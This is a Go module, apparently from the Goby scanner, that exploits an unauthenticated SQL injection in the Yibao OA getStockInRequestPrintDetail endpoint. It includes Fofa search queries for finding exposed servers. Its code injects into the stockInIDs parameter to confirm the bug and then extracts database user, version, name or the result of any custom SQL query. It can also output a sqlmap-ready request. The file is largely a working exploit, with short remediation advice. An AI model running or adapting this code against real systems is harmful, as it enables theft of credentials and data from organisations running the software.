package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yibao OA /SmartTradeScan/StockIn/getStockInRequestPrintDetail SQL Injection Vulnerability",
    "Description": "<p>Yeebao OA system is a comprehensive software platform that provides services for the daily office work of enterprises and institutions. It has multiple functions such as information management, process management, knowledge management (archive and business management), collaborative office, etc. Yeebao OA getStockInRequestPrintDetail interface has a SQL injection vulnerability. Unauthenticated attackers can use this vulnerability to obtain sensitive database information, user names and passwords, and further exploit it to obtain server permissions.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-11-07",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"$.cookie(\\\\\\\\\\\\\\\"topvision_oaName\" || title=\"欢迎登录易宝OA系统\"&&body=\"顶讯\"",
    "GobyQuery": "body=\"$.cookie(\\\\\\\\\\\\\\\"topvision_oaName\" || title=\"欢迎登录易宝OA系统\"&&body=\"顶讯\"",
    "Level": "2",
    "Impact": "<p>It has multiple functions such as information management, process management, knowledge management (archive and business management), collaborative office, etc. Yeebao OA getStockInRequestPrintDetail interface has a SQL injection vulnerability. Unauthenticated attackers can use this vulnerability to obtain sensitive database information, user names and passwords, and further exploit it to obtain server permissions.</p>",
    "Recommendation": "<p>1. Pay attention to the latest news from manufacturers and update to the latest version in time: <a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a></p><p>2. Reduce or avoid string concatenation toexecute SQL, and instead pass user input as a parameter to the SQL executionmethod   </p><p>3.Verify the value entered by the user</p>",
    "References": [
        "https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488526&idx=1&sn=9500ab937689c4cc6402c0f1a560d8dd&chksm=c267a13df510282b692ca1fa46be4eeea73dd6f66729ce4ce2c97cc902d167f4ae0e03858df0&token=2115358587&lang=zh_CN#rd"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "user",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "user,@@version,db_name()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "易宝OA /SmartTradeScan/StockIn/getStockInRequestPrintDetail SQL 注入漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝OA系统是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、 流程管理 、知识管理(档案和业务管理)、协同办公等多种功能。易宝OA getStockInRequestPrintDetail接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。<br></p>",
            "Recommendation": "<p>1.关注厂商最新消息，及时更新到最新版本：<a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a></p><p>2.减少使用或不使用字符串拼接的方式执行SQL，而是将用户输入当着参数传给执行SQL的方法&nbsp;</p><p>3.对用户输入的值进行校验<br></p>",
            "Impact": "<p>易宝OA getStockInRequestPrintDetail接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yibao OA /SmartTradeScan/StockIn/getStockInRequestPrintDetail SQL Injection Vulnerability",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>Yeebao OA system is a comprehensive software platform that provides services for the daily office work of enterprises and institutions. It has multiple functions such as information management, process management, knowledge management (archive and business management), collaborative office, etc. Yeebao OA getStockInRequestPrintDetail interface has a SQL injection vulnerability. Unauthenticated attackers can use this vulnerability to obtain sensitive database information, user names and passwords, and further exploit it to obtain server permissions.<br></p>",
            "Recommendation": "<p>1. Pay attention to the latest news from manufacturers and update to the latest version in time: <a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a><br></p><p>2. Reduce or avoid string concatenation toexecute SQL, and instead pass user input as a parameter to the SQL executionmethod &nbsp;&nbsp;</p><p>3.Verify the value entered by the user<br></p>",
            "Impact": "<p>It has multiple functions such as information management, process management, knowledge management (archive and business management), collaborative office, etc. Yeebao OA getStockInRequestPrintDetail interface has a SQL injection vulnerability. Unauthenticated attackers can use this vulnerability to obtain sensitive database information, user names and passwords, and further exploit it to obtain server permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}

		rawPayload := fmt.Sprintf("(SELECT CONCAT(CONCAT('qzppq',(%s)),'qzbzq'))) --", sql)
		urlget := "/SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=" + url.QueryEscape(rawPayload)
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/SmartTradeScan/StockIn/getStockInRequestPrintDetail"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			content := hex.EncodeToString(MD5Hash.Sum(nil))

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','" + strconv.Itoa(MD5Reslut) + "')),3,32)"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `<td align="left">([\s\S]*)<\/td>`
			//
			//makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			//	reRequest := regexp.MustCompile(RegularUrl)
			//	if !reRequest.MatchString(RegularContent) {
			//		return "", fmt.Errorf("can't match value")
			//	}
			//	getname := reRequest.FindStringSubmatch(RegularContent)
			//	return getname[1], nil
			//}

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1* HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept-Encoding: gzip, deflate\n\n"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `qzppq([^"]+)qzbzq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
